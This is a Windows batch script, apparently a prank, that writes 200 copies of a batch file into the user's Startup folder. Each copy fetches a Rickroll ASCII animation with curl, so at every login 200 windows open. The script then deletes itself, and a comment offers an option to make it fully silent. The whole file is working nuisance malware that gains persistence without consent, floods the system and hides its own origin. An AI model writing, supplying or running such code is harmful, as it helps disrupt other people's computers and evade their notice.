@echo off
set startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: Create 200 copies of rick.bat inside Startup
for /l %%i in (1,1,200) do (
  > "%startup%\rick%%i.bat" echo @echo off
  >> "%startup%\rick%%i.bat" echo curl ascii.live/rick
)

:: Done message (optional, remove if you want it fully silent)
echo Done! Created 200 startup files.

:: Self-delete
(del "%~f0") >nul 2>&1

:: Close the CMD window
exit
